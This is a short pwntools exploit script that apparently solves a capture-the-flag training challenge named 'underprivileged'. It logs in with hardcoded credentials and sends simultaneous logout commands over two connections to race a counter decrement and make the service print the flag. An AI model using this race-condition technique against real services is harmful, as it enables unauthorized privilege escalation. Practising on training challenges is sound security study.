from pwn import *
import time


def get_token(c):
    c.recvuntil(b"token: ")
    return c.recvline().strip()

def login(c):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"username: ")
    c.sendline(b"user")
    c.recvuntil(b"password: ")
    c.sendline(b"supersecurepassword")

def get_flag(c):
    c.recvuntil(b"> ")
    c.sendline(b"4")
    c.recvline() # skip username
    print(c.recvline().strip())

if args.REMOTE:
    c_token = remote("underprivileged.training.offensivedefensive.it", 8080, ssl=True)
    token = get_token(c_token)

    c1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
    c1.recvuntil(b"Token: ")
    c1.sendline(token)
    c2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
    c2.recvuntil(b"Token: ")
    c2.sendline(token)

else:
    c_port = process("./underprivileged")
    c_port.recvuntil(b"port: ")
    port = int(c_port.recvline().strip().decode())
    
    c1 = remote("127.0.0.1", port)
    c2 = remote("127.0.0.1", port)

# race condition on the logout function we trig the program to decrement a counter twice to make it print the flag
while 1:
    login(c1)

    c1.recvuntil(b"> ")
    c2.recvuntil(b"> ")
    c1.sendline(b"2")
    c2.sendline(b"2")

    get_flag(c1)
    time.sleep(0.4)